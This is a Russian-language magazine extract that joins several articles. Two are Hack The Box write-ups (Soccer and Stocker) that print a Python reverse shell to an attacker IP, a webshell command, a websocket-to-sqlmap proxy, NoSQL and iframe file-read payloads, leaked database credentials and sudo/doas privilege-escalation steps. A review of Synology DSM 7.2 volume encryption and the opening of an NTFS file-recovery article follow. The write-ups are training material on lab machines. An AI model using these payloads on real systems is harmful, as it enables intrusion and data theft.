Файл загружен, поэтому можем проверить его работу, выполнив команду id.


curl 'http://soccer.htb/tiny/uploads/shell.php?cmd=id'





                         Результат выполнения команды id

Теперь запустим реверс‑шелл на Python 3.


python3 -c 'import socket,subprocess,os;s=socket.socket(socket.
AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.78",4321));os.dup2(
s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import
pty;pty.spawn("sh")'


Справка: реверс-шелл
Обратный шелл — это подключение, которое активирует атакуемая машина,
а мы принимаем и таким образом подключаемся к ней, чтобы выполнять
команды от лица пользователя, запустившего шелл. Для приема соединения
необходимо создать на локальной машине listener, то есть «слушатель».


Его подключение будем ловить на листенер:


pwncat-cs -lp 4321





                           Получение новой сессии




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
         HTB SOCCER
                    ПОВЫШАЕМ ПРИВИЛЕГИИ
             В LINUX ЧЕРЕЗ СВОЙ ПЛАГИН ДЛЯ DOAS





ПРОДВИЖЕНИЕ
Теперь нам необходимо собрать информацию. Для этого воспользуемся
PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.


Загрузим на хост скрипт для Linux, дадим право на выполнение и запустим
сканирование. В выводе будет много информации, поэтому отберем только
значимую.
  Из файла /etc/hosts узнаем о еще одном поддомене — soc-player.
soccer.htb.





                           Информация о сети

Среди открытых портов отмечаем порт 3306, на котором работает служба
mysql.





                                Открытые порты

Флаг находится у пользователя player, поэтому продвигаться нам нужно
к нему.





                Файлы в каталогах других пользователей

Среди «неродных» файлов системы присутствует doas.





               Файлы, вероятно добавленные пользователем

Добавляем новый найденный поддомен в файл /etc/hosts своего хоста
и смотрим новый сайт.


10.10.11.194 soccer.htb soc-player.soccer.htb





                 Главная страница сайта soc-player.soccer.htb

После регистрации и авторизации нам открывается функция бронирования
билета на матч.





                     Форма бронирования билета

Отмечаем уже присвоенный ID билета (над полем ввода). После ввода этого
ID  получаем  ответ,  что  билет  существует. В Burp  History  запроса
не находим, но зато появляются сообщения в истории веб‑сокетов, где мы
и обнаруживаем наш запрос и ответ.





                              Запрос билета





                            Запрос на сервер





                                 Ответ сервера

Так  как на  хосте  работает СУБД,  проверяем  несколькими  нагрузками
для SQL-инъекций параметр id, и одна из нагрузок дает результат.


{
    "id":"-1 or 1=1 -- -"
}





                            Запрос с нагрузкой


SQL injection
Чтобы автоматизировать и ускорить эксфильтрацию данных из базы, можно
использовать sqlmap. Для  этого  нужно будет написать  прокси‑сервер,
который будет принимать запросы HTTP и отправлять их на удаленный сервер
через веб‑сокет. Откроем исходный код сайта и найдем URL, куда поступают
запросы через веб‑сокеты.





                     Исходный код страницы /check

Теперь реализуем наш прокси‑сервер.


from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection


ws_server = "ws://soc-player.soccer.htb:9091"


def send_ws(payload):
    ws = create_connection(ws_server)
    message = unquote(payload).replace('"',''')
    data = '{"id":"%s"}' % message


    ws.send(data)
    resp = ws.recv()
    ws.close()


    if resp:
        return resp
    else:
        return ''


def middleware_server(host_port,content_type="text/plain"):


    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=',1)[1]
            except IndexError:
                payload = False


            if payload:
                content = send_ws(payload)
            else:
                content = 'No parameters specified!'


            self.send_header("Content-type", content_type)
            self.end_headers()
            self.wfile.write(content.encode())
            return


    class _TCPServer(TCPServer):
        allow_reuse_address = True


    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()



print("[+] Starting MiddleWare Server")
print("[+] Send payloads in http://localhost:8081/?id=*")


try:
    middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:
    pass




                            Запуск прокси‑сервера

Теперь запускаем sqlmap, указав адрес прокси‑сервера:


http://localhost:8081/?id=

И выбираем рабочую технику Boolean Based.


sqlmap -u 'http://localhost:8081/?id=54172' --technique B --level 5
--risk 3





                       Определение нагрузки sqlmap

Sqlmap определил рабочую нагрузку, теперь мы можем получить список баз
данных (параметр --dbs).


sqlmap -u 'http://localhost:8081/?id=54172' --technique B --level 5
--risk 3 --dbs





                        Существующие базы данных

Нам интересна база данных soccer_db, узнаем, какие таблицы она содержит
(параметр --tables).


sqlmap -u 'http://localhost:8081/?id=54172' --technique B --level 5
--risk 3 -D soccer_db --tables

В базе всего одна таблица с говорящим названием accounts, получим из нее
все данные (параметр --dump).





                        Таблицы в базе soccer_db


sqlmap -u 'http://localhost:8081/?id=54172' --technique B --level 5
--risk 3 -D soccer_db -T accounts --dump





                        Данные таблицы accounts

Полученный пароль можно использовать для авторизации по SSH.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Ранее мы нашли doas, взглянем на его настройки:


cat /usr/local/etc/doas.conf





                      Содержимое файла doas.conf

Эта строчка значит, что пользователь player без ввода пароля может от име‐
ни пользователя root запустить команду /usr/bin/dstat. Про dstat под‐
робно почитать можно в документации. Там же находим и информацию о пла‐
гинах dstat, которые стартуют при запуске самого dstat.
   Плагин должен представлять собой скрипт на Python dstat_*.py, рас‐
положенный в одном из следующих каталогов.





                            Каталоги для плагинов dstat

Поочередно проверяем эти каталоги и находим, что у группы player, где мы
и состоим, есть право записи в один из них:


/usr/local/share/dstat





                  Содержимое каталога /usr/local/share/

В найденном каталоге создадим плагин dstat_ralf.py, который просто
запустит командную оболочку /bin/bash.


import os
os.system('/bin/bash')

Теперь просмотрим список плагинов и найдем свой.


dstat --list





                           Список плагинов dstat

А теперь запускаем свой плагин от имени пользователя root, что дает нам
привилегированную командную оболочку.


doas -u root /usr/bin/dstat --ralf




                           Флаг рута

Мы получили флаг рута, а значит, машина захвачена!
ВЗЛОМ

       HTB
 STOCKER





     ИСПОЛЬЗУЕМ ГЕНЕРАТОР PDF
     ДЛЯ ПРОИЗВОЛЬНОГО ЧТЕНИЯ
            ФАЙЛОВ





В этом райтапе я покажу типичный сце‐
нарий захвата веб‑сервера. Сначала про‐
ведем   базовое   сканирование   сайта
на предмет скрытых каталогов, затем про‐
ведем  NoSQL-инъекцию,  чтобы  обойти             RalfHacker                                                                                             hackerralf8@gmail.com
авторизацию,  и  HTML-инъекцию,  чтобы
прочитать      произвольные      файлы.
При повышении  привилегий  используем
обход  каталогов Bash для  чтения  поль‐
зовательского скрипта.


Захватывать будем тренировочную машину Stocker с площадки Hack The Box.
Уровень ее сложности — легкий.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.196    stocker.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел всего два открытых порта: 22 — служба OpenSSH 8.2p1 и 80 —
веб‑сервер Nginx 1.18.0. С SSH сейчас ничего сделать не можем, поэтому
проходим к веб‑серверу.





                      Главная страница сайта stocker.htb


ТОЧКА ВХОДА
На сайте ничего интересного найти не удалось, поэтому приступим к поиску
скрытых файлов и каталогов, на которые не ведут ссылки. Я для этого исполь‐
зую feroxbuster .


Справка: сканирование веба c feroxbuster
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch, DIRB или  ffuf. Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -d — глубина сканирования.



Набираем такую команду:


feroxbuster -u http://stocker.htb/ -w directory_2.3_medium_lowercase.
txt -d 2 -t 256





            Результат сканирования каталогов с помощью feroxbuster

Ничего найти не удалось, поэтому сканируем поддомены. Их я исследую
с помощью ffuf, перебирая заголовок Host (остальные ключи те же, что
у ferox).


ffuf -u http://stocker.htb/ -w subdomains-top1million-110000.txt -t
256 -H 'Host: FUZZ.stocker.htb'





                       Результат сканирования поддоменов

В выводе получаем все слова из списка, поэтому стоит использовать фильтр
(параметр -fs), отсекающий ненужные ответы по размеру страницы.


ffuf -u http://stocker.htb/ -w subdomains-top1million-110000.txt -t
256 -H 'Host: FUZZ.stocker.htb' -fs 178



                       Результат сканирования поддоменов

И находим всего один новый поддомен — dev. Добавляем его в файл /etc/
hosts.


10.10.11.196 stocker.htb dev.stocker.htb





                   Страница авторизации dev.stocker.htb


ТОЧКА ОПОРЫ
Возможности авторизоваться на сайте нет, поэтому будем искать обходные
пути.





                          Запрос на авторизацию

Я сразу протестировал разные варианты обхода авторизации для разных тех‐
нологий и уязвимостей с помощью Burp Intruder. Ничего найти не удалось,
поэтому я перешел к тем вариантам, которые в брутфорсер не заложены. Так
доходим до одной из JSON-нагрузок для эксплуатации NoSQL-инъекции.


{
    "username": {
        "$ne": null
    },
    "password": {
        "$ne": null
    }
}





                          Запрос на авторизацию

И нам становится доступен какой‑то онлайновый магазин.





                           Главная страница сайта

Перейдем к списку товаров и добавим любой из них в корзину. Затем перехо‐
дим к корзине и просматриваем ее содержимое.





                             Товары на сайте





                         Корзина онлайн‑магазина

Пробуем подтвердить покупку, после чего нам дают ссылку на чек.





                         Подтверждение покупки

При переходе по ссылке получаем отдельный PDF-документ с информацией
о товаре.





                     Чек с информацией о покупке

Мы прошли полный путь от авторизации до получения чека, теперь перейдем
к истории запросов в Burp History и подробнее посмотрим, что при этом
происходило.


Произвольное чтение файлов
В запросе на генерирование файла видим отправляемые параметры.





                     Запрос на /api/order в Burp History

Можно было бы вместо пути к картинке в параметре image отправить путь
к произвольному файлу, но картинка в отчете не отображается. Единственный
параметр, который находит отражение в отчете, — это поле title, наиме‐
нование товара. Генераторы PDF часто позволяют проводить инъекцию тега
iframe, в котором мы можем отобразить локальный файл. Для примера поп‐
робуем вставить в PDF файл /etc/passwd.


<iframe src=file:///etc/passwd height=800px width=800px></iframe>





                     Запрос на генерирование отчета

В ответе видим идентификатор отчета, который вставляем в ссылку такого
вида:


http://dev.stocker.htb/api/po/63fb37ad3724ba9a5070fffa





                   Новый отчет с включенным фреймом

И вместо наименования товара получаем вставленный фрейм с запрошен‐
ным файлом. В etc/passwd видим активного пользователя angoose с дей‐
ствующей командной оболочкой /bin/bash. Так как мы можем читать файлы,
посмотрим исходные коды сайта.
  По названию поддомена dev предполагаем, что сайт расположен в соот‐
ветствующем  каталоге  /var/www/dev/. По  названию  параметра  куки
connect.sid можно предположить, что используется Node.js, поэтому будем
запрашивать файл /var/www/dev/index.js.


<iframe src=file:///var/www/dev/index.js height=800px width=800px></
iframe>





                   Новый отчет с включенным фреймом

В исходном коде index.js отмечаем использование СУБД MongoDB, а также
учетные данные для подключения к базе.


mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?
authSource=admin&w= 1

Пробуем применить найденный пароль для авторизации по SSH от имени
пользователя angoose и получаем сессию на машине.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Теперь нам необходимо собрать информацию. Я для этого обычно исполь‐
зую скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.



Загрузим на хост скрипт для Linux, дадим право на выполнение и запустим
сканирование. В выводе будет много информации, но ничего важного найти
не удалось, кроме сообщения о запросе пароля для просмотра настроек
sudoers.



                 Ошибка при запросе настроек sudoers


Справка: sudoers
Файл /etc/sudoers в Linux содержит списки команд, которые разные группы
пользователей могут выполнять от имени администратора системы. Можно
просмотреть его как напрямую, так и при помощи команды sudo -l.



Выполним команду sudo -l и введем известный пароль.





                               Настройки sudoers

Мы можем выполнить от имени пользователя root такую команду:


/usr/bin/node /usr/local/scripts/* .js

В данном случае выполнить произвольный код Node.js очень легко, так как в
значении символа «звездочка» можно передавать и последовательность
../../../ для  обхода  каталога. Используем  это,  чтобы  создать файл
rshell.js, который присвоит бит SUID файлу командной оболочки /bin/
bash.


require('child_process').exec('chmod u+s /bin/bash')

Теперь выполним скрипт следующей командой, после чего проверим права
файла /bin/bash:


sudo /usr/bin/node /usr/local/scripts/../../../../home/angoose/
rshell.js





                          Результат выполнения команды


Справка: бит SUID
Когда у файла установлен атрибут setuid (S-атрибут), обычный пользователь,
запускающий этот файл, получает повышение прав до пользователя — вла‐
дельца файла в рамках запущенного процесса. После получения повышенных
прав приложение может выполнять задачи, которые недоступны обычному
пользователю. Из‑за возможности состояния гонки многие операционные
системы игнорируют S-атрибут, установленный shell-скриптам.





                           Флаг рута

Флаг рута у нас, а значит, машина захвачена!
ПРИВАТНОСТЬ





 ШИФРУЙСЯ

                    ИЗУЧАЕМ НОВЫЙ
                        МЕХАНИЗМ
            ШИФРОВАНИЯ SYNOLOGY




В новой  версии операционной системы
DSM 7.2 для сетевых хранилищ Synology
появилась   долгожданная   возможность
шифрования томов. Насколько она удобна,
надежна и отвечает требованиям безопас‐          Олег Афонин                                                                                      Эксперт по мобильной
ности? Давай разбираться!                                    криминалистике компании                                                                                         «Элкомсофт»
                                                                                               aoleg@voicecallcentral.com

В недавно вышедшем обновлении DSM 7.2 разработчики Synology добавили
зашифрованные тома в дополнение к существующему методу шифрования
сетевых папок. Новый для Synology способ шифрования более универсален
и работает быстрее использовавшегося ранее, но не обошлось и без ложки
дегтя, которая делает такой способ защиты данных практически бесполез‐
ным.
   Несколько лет назад я писал об особенностях защиты данных в сетевых
хранилищах разных производителей. В NAS от Synology применялось шиф‐
рование сетевых папок с использованием стандартной для Linux криптогра‐
фической файловой системы eCryptFS. Кроме того, что с таким подходом
связано множество ограничений и неудобств, управление ключами шиф‐
рования было реализовано прямолинейно и небезопасно. Если пользователь
включал автоматическое монтирование сетевых папок, то ключи шифрования,
сохраненные на самом  устройстве либо на внешнем USB-накопителе,
защищались фиксированным известным паролем, что делало защиту неэф‐
фективной.
  В новой версии операционной системы Synology DSM 7.2 появилось дол‐
гожданное шифрование на уровне тома. По утверждениям разработчиков,
новый способ защиты данных работает быстрее механизма шифрования
сетевых папок и при этом избавился от присущих пофайловому шифрованию
ограничений. В то же время механизм управления ключами снова реализован
так, что на большинстве устройств реальная защищенность данных оказыва‐
ется далека от желаемой.


Развитие событий
Пока мы готовили статью к публикации, произошел ряд интересных вещей.
  В течение восьми часов после выхода DSM 7.2 защиту, обеспечиваемую
шифрованием тома с обязательным хранением ключей на том же диске, уда‐
лось обойти. Для этого достаточно смонтировать в Linux системный раздел
DSM (он хранится в незашифрованном и неподписанном виде в зеркальном
RAID на всех установленных в NAS дисках) и отредактировать несколько тек‐
стовых файлов. Подробности — в треде на Reddit.
  В скобках заметим, что и внешний KMIP-сервер от этой атаки не спасет,
если в процессе загрузки NAS этот сервер окажется доступен, а автомати‐
ческое монтирование тома — включено.
   Между написанием и публикацией этой статьи разработчики Synology
успели выпустить два обновления DSM 7.2, в последнем из которых проблема
со сторонними KMIP-серверами была исправлена. Подробно о работе KMIP
в Synology рассказано в публикации на Reddit, а скачать работоспособный
опенсорсный KMIP-сервер можно из репозитория на GitHub.



ШИФРОВАНИЕ В SYNOLOGY: КАК БЫЛО

Если ты хочешь в деталях ознакомиться с методом шифрования сетевых
папок, механизмом управления ключами в Synology DSM и узнать о выяв‐
ленной в нем уязвимости, порекомендую статью «Дырявые диски. Эксплуати‐
руем уязвимости в сетевых хранилищах Synology». Добавлю только, что с тех
пор никаких изменений в механизме хранения ключей не произошло и поль‐
зователи, которые включили автоматическую разблокировку сетевых папок,
до сих пор подвергают зашифрованные данные риску. Здесь же я хочу кратко
описать основные достоинства и недостатки eCryptFS — криптографической
файловой  системы,  которую  выбрали   разработчики  Synology  DSM
для защиты сетевых папок.
   Вот список достоинств шифрования на уровне сетевых папок:
 1. Поскольку шифруются отдельные сетевые  папки, не имеет значения,
   на каком из внутренних физических или логических накопителей они рас‐
   положены (а вот зашифровать таким образом USB-накопитель поль‐
   зователю не удастся).
 2. Каждая сетевая папка может быть зашифрована уникальным паролем.
   Если пользователей несколько, каждый может использовать собственный
   пароль.
 3. Содержимое зашифрованной папки можно просто скопировать на другой
   накопитель, и данные останутся зашифрованными. Необходимости вво‐
   дить (или даже знать) пароль шифрования нет, так что резервное копиро‐
   вание как на локальные, так и на удаленные системы можно проводить
   без монтирования (и расшифровки) сетевых папок.
 4. eCryptFS защищает как данные, так и имена файлов и папок (последнее —
   небесплатно).

Несмотря на все достоинства, у шифрования сетевых папок есть ряд сущес‐
твенных недостатков:
 1. Ограничение на длину имен файлов. В имени файла в зашифрованной
   папке не может быть больше 143 символов ANSI или 47 символов иерог‐
   лифической записи. Это прямое следствие шифрования имен файлов
   и папок.
 2. Несмотря на то что имена файлов и папок шифруются, общая структура
   данных остается доступной внешнему наблюдателю, включая размеры
   и атрибуты отдельных файлов и папок.
 3. Заметно страдает скорость доступа к данным, особенно если речь идет
  о множестве мелких файлов.
 4. Разработчики  Synology не  предусмотрели  разделения  ключей шиф‐
   рования на первичные и вторичные. Для шифрования данных использует‐
   ся ключ, получаемый напрямую из пароля, который вводит пользователь.
   Как следствие — невозможно отозвать скомпрометированный пароль
   или изменить пароль шифрования (расшифровку всего массива данных
   с его последующим шифрованием другим паролем мы не рассматриваем,
   как максимально неэффективный способ потратить время).
 5. Наконец, механизм управления ключами шифрования Synology, хоть и не
   является частью eCryptFS, позволяет расшифровать содержимое устрой‐
   ства, если пользователь включит функцию автоматического монтирования
   зашифрованных папок.

Обрати пристальное внимание на пункт 5: данные зашифрованных сетевых
папок уязвимы, если пользователь активирует необязательную функцию авто‐
матического монтирования. Если же он не станет этого делать, а то и вовсе
решит не сохранять пароль шифрования ни на самом устройстве, ни на внеш‐
нем USB-накопителе, то для расшифровки защищенных сетевых папок пот‐
ребуется атака перебором паролей, что совершенно не гарантирует резуль‐
тата, если был выбран длинный и сложный пароль. Это очень важный момент:
механизм управления ключами в новом способе шифрования Synology пре‐
терпел кардинальные изменения, но, увы, не в пользу усиления безопас‐
ности.


ШИФРОВАНИЕ ДИСКОВ: НОВОЕ В DSM 7.2

В недавно вышедшей версии DSM 7.2 появилась возможность шифрования
тома —  volume  encryption.  Используется  стандартный механизм LUKS
в режиме aes-xts-plain64.





Включить шифрование можно только на вновь создаваемых томах. Зашиф‐
ровать данные на уже имеющемся томе нельзя.
  При включении шифрования тома система предложит пользователю сох‐
ранить резервный ключ, с помощью которого том можно будет расшифро‐
вать, если что‑то случится с основной системой. Забегая вперед, скажу, что
ранее выданные резервные ключи можно отозвать, сгенерировав новый ключ
(в этом случае ранее выданный ключ перестанет работать).
   Важный момент: по умолчанию ключ к зашифрованному тому сохраняется
на том же устройстве, на котором создается сам зашифрованный том.
Это позволяет системе автоматически монтировать зашифрованные тома
при загрузке NAS. Не сохранять ключ, равно как и отказаться от автоматичес‐
кого монтирования тома при загрузке, нельзя: единственная альтернатива —
использовать внешний KMIP-сервер, в роли которого на данный момент
может выступать только другой NAS от Synology (как это работает, можно
узнать в документации производителя).
   Запишем в блокнотик: в бета‑версиях DSM 7.2 была возможность исполь‐
зовать KMIP-серверы сторонней разработки  (кстати, сами разработчики
Synology как раз и используют один из вариантов с открытым исходным
кодом). В релизе DSM 7.2 эту возможность убрали, на мой взгляд — совер‐
шенно напрасно с точки зрения безопасности данных, но очень правильно
с точки зрения маркетинга (возможность продать дополнительное устройство
Synology из свежей линейки — только такие поддерживают нужные для орга‐
низации KMIP-сервера функции).
   Таким образом, получаем два возможных варианта хранения ключей —
и оба небезопасны:
 1. Ключ к зашифрованному тому хранится на локальном устройстве. В этом
   случае мы  имеем  дело  с  классическим  security  through  obscurity:
   в документации Synology нет информации о том, где именно хранится
   ключ шифрования, и это — единственное, что может не остановить,
   но замедлить злоумышленника, получившего физический доступ к устрой‐
   ству.
 2. Ключ хранится на другом устройстве Synology: в этом случае злоумыш‐
   леннику придется получить физический доступ уже к двум устройствам
   и повозиться с расшифровкой ключа шифрования, который  хранится
   на втором девайсе. И если второе устройство Synology, выполняющее
   роль KMIP-сервера, находится в той же или соседней комнате, что
   и устройство с зашифрованным томом, то полагаться на него для защиты
   пляжных фото в купальнике, наверное, можно, а вот без такового, пожалуй,
   не  стоит. И хотя безопасность KMIP — тема отдельная и довольно
   обширная, физическая недоступность KMIP-сервера для злоумышленни‐
   ка — один из ключевых моментов в обеспечении безопасного хранения
   ключей. В скобках отметим: KMIP-сервер может хранить ключи как на
   обычных, так и на зашифрованных томах.


СОВМЕСТНОЕ ИСПОЛЬЗОВАНИЕ ШИФРОВАНИЯ ТОМА И СЕТЕВЫХ
ПАПОК

Мне было интересно узнать, получится ли создать зашифрованную сетевую
папку на зашифрованном томе. Оказалось, что никаких препятствий к этому
нет: шифрование тома полностью прозрачно; на зашифрованных томах мож‐
но создавать и использовать как зашифрованные, так и незашифрованные
сетевые папки. Можно как реплицировать на зашифрованные тома снимки
(снапшоты) зашифрованных на другом NAS сетевых папок, так и проделывать
то же самое в обратную сторону. Короче говоря, шифрование тома целиком
и полностью прозрачно.
   Таким образом, в DSM 7.2 доступны следующие варианты защиты данных:
 1. Только шифрование тома.
 2. Только шифрование сетевых папок.
 3. Зашифрованные сетевые папки на зашифрованном томе.

Разумеется, при использовании в качестве второго слоя защиты шифрования
сетевых папок мы получим все те ограничения, которые были описаны
в начале статьи. Кроме того, вероятно, общая скорость доступа к дважды
зашифрованным данным еще немного упадет (замеры производительности
каждого варианта шифрования — тема для отдельной статьи).


                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ
        ШИФРУЙСЯ

          ИЗУЧАЕМ НОВЫЙ МЕХАНИЗМ ШИФРОВАНИЯ
                                   SYNOLOGY





ШИФРОВАНИЕ ТОМА: КАК ЭТО ВЫГЛЯДИТ

Пройдемся по процессу создания зашифрованного тома и соответствующим
настройкам.
   Первые шаги при создании зашифрованного тома не отличаются от при‐
вычных для Synology DSM. Настройки шифрования появляются на втором
шаге.





При включении шифрования тебе нужно выбрать пароль хранилища (vault
password), который по умолчанию будет сохранен на локальном устройстве.





На следующем шаге система предложит сохранить ключ восстановления
(recovery key).





Наконец, система предупредит о последствиях, которые наступят, если ты
потеряешь и ключ восстановления, и доступ к хранилищу.





Обрати внимание: чтобы использовать шифрование тома, тебе придется
включить хранилище ключей шифрования (тот пароль, который ты вводил
на первом шаге, используется для защиты хранилища ключей).





Если ты забудешь пароль к хранилищу — ничего страшного, его можно сбро‐
сить в любой момент. Знать оригинальный пароль не нужно; все, что тебе
потребуется, — указать пароль пользователя DSM с администраторским дос‐
тупом.





Отключить хранилище ты не сможешь.





По крайней мере до тех пор, пока не настроишь удаленное хранение ключей
на KMIP-сервере.





В роли KMIP-сервера может выступать только другой NAS от Synology, при‐
чем только такой, который поддерживает шифрование тома (а это — модели
от 2020-го модельного года). Хранилище ключей шифрования можно создать
как на обычном, так и на зашифрованном томе.





Если ты утратишь доступ к хранилищу, можно расшифровать том при помощи
ранее созданного ключа восстановления доступа. Если ключ восстановления
доступа будет утрачен или скомпрометирован, ты сможешь сгенерировать
новый (ранее созданный ключ при этом будет отозван).





Кстати, каждое устройство Synology (из тех, что поддерживают шифрование
тома) может использоваться и в качестве KMIP-сервера, и в качестве кли‐
ента.





Единственное ограничение: ты не можешь использовать пару устройств
для взаимного хранения ключей (если устройство А выступает в роли KMIP-
сервера для устройства Б, то устройство Б не может быть KMIP-сервером
для устройства А).


             INFO

                    Один  из  пользователей  разработал  решение
                        с открытым исходным кодом для Raspberry  Pi
                      или другого компьютера под управлением Linux
                       на  основе  PyKMIP.  Проект  KMIP  Server  for
                        Synology DSM  позволяет  хранить ключи шиф‐
                       рования на внешнем устройстве, где они могут
                      быть защищены любым удобным способом, нап‐
                     ример сохранены на зашифрованном томе LUKS,
                      который не будет автоматически монтироваться
                      при загрузке сервера. К сожалению, в релизе
                 DSM 7.2 этот способ работать перестал: воз‐
                      можность  использования  сторонних  KMIP-сер‐
                       веров разработчики DSM отключили.



ШИФРОВАНИЕ ТОМА В SYNOLOGY И QNAP

В сетевых хранилищах QNAP поддерживаются все возможные виды шиф‐
рования — от SED до шифрования тома и сетевых папок включительно.
Об этом мы писали в статье «Слои защиты. Три уровня шифрования в сетевых
хранилищах QNAP». Я не буду подробно сравнивать особенности реализации
шифрования и хранения ключей в устройствах разных производителей; отме‐
чу лишь, что такие операции, как монтирование, размонтирование и смена
ключей зашифрованных томов, занимают на устройствах QNAP несколько
минут, а на устройствах Synology — считаные секунды.


СРАВНЕНИЕ ШИФРОВАНИЯ ТОМА И ШИФРОВАНИЯ СЕТЕВЫХ
ПАПОК

Если сравнить шифрование тома и сетевых папок, то можно сделать сле‐
дующие выводы.
   Шифрование тома обеспечивает защиту всего хранящегося на томе
содержимого, включая все сетевые папки (в том числе домашние папки поль‐
зователей), метаданные файловой системы, виртуальные машины, приложе‐
ния и контейнеры. Шифрование сетевых папок защищает только содержимое
файлов и имена файлов и папок; структура файловой системы и метаданные
при этом свободно доступны.
  Оба метода позволяют сменить пароль для доступа к хранилищу ключей,
но только шифрование тома дает возможность сменить скомпрометирован‐
ный ключ восстановления и отозвать ранее выданные ключи. Шифрование
сетевых папок требует расшифровки и повторного шифрования всех данных
для смены скомпрометированного ключа.
   Шифрование тома имеет стандартное для Linux ограничение на длину
имени файлов и папок в 255 символов, в то время как шифрование сетевых
папок имеет ограничение в 143 символа.
   Шифрование тома обеспечивает прирост производительности на 48%
по сравнению с шифрованием папок (по официальным данным Synology).
Шифрование сетевых папок может вызывать заметное падение быстродей‐
ствия, особенно при работе с небольшими файлами.
   Способы хранения ключей и управления ими сильно различаются. Шиф‐
рование тома предусматривает локальное хранение ключей (они защища‐
ются паролем хранилища, который также обязательно сохраняется на локаль‐
ном диске) либо возможность хранения на сервере KMIP (в роли которого
может выступать только другое устройство Synology последних лет выпуска).
Шифрование сетевых папок  использует  локальное или USB-хранилище
с защитой паролем, который может сохраняться локально на устройстве
или не сохраняться вовсе.
  Оба метода поддерживают автоматическое монтирование при загрузке,
но оно обязательно для шифрования тома и опционально для шифрования
сетевых папок.
  В следующей таблице я собрал основные особенности обоих методов
шифрования.





ВЫВОДЫ

Что лучше — шифрование тома или сетевых папок? Выбор между этими дву‐
мя вариантами зависит от конкретных потребностей и требований безопас‐
ности. Шифрование тома  предлагает более широкий  спектр  защиты,
высокую производительность и гибкость в управлении ключами, в то время
как шифрование сетевых папок более удобно в использовании и не требует
обязательного сохранения пароля, а также автоматического монтирования
зашифрованных данных при загрузке устройства. Поскольку в DSM 7.2 под‐
держивается одновременное шифрование как тома, так и сетевых папок, ты
можешь зашифровать том (это быстро и удобно) и использовать допол‐
нительное шифрование только для тех сетевых папок, для которых это дей‐
ствительно нужно.
ТРЮКИ




ВОСКРЕШЕНИЮ
  ПОДЛЕЖИТ

      ВОССТАНАВЛИВАЕМ ФАЙЛЫ
     В NTFS С ИСПОЛЬЗОВАНИЕМ
            POWERSHELL





Существует множество способов вернуть
утраченные или удаленные с накопителей
файлы. В  статье мы с тобой  освежим
в памяти теоретические основы восстанов‐
                                                                                Антон Кузнецовления удаленной информации в файловой                                                                                          anton.aleksandrovich65@gmail.co
                                                                mсистеме NTFS v3.1 и подробно рассмотрим
практический способ ручного  восстанов‐
ления    файлов    с    использованием
PowerShell.


             INFO

                             Хочу отдать должное Крису Касперски за его тру‐
                    ды на эту тему и подробное описание теории
                      и  практики в  книге  «Восстановление  данных.
                           Практическое руководство», а заодно поблагода‐
                        рить Валентина Холмогорова и Ксению Кирилову
                        за обновление и переиздание книги в 2021 году.


Сегодня создано предостаточно программных решений для восстановления
удаленных файлов с различных файловых систем. Однако, если переф‐
разировать известное изречение, практика без теории мертва: чтобы мак‐
симально эффективно использовать инструменты, нужно понимать, как они
работают. Если перед специалистом стоит задача не просто вернуть утрачен‐
ные файлы, а разобраться в причинах инцидента, знания об устройстве фай‐
ловых систем просто необходимы.


ТЕОРИЯ

Подробно рассматривать структуру NTFS я не вижу смысла, описание можно
найти в книге Криса «Восстановление данных. Практическое руководство»
и статье «Файловая система NTFS извне и изнутри» (в двух частях). Однако,
чтобы наши действия при восстановлении файлов были осмысленными, нам
все же придется освежить в памяти некоторые ключевые особенности фай‐
ловой системы NTFS 3.1, а заодно вспомнить, как хранятся и удаляются фай‐
лы.


           WARNING

                    Не храни важные файлы на одном томе с опе‐
                        рационной  системой  (обычно  это  диск  С):
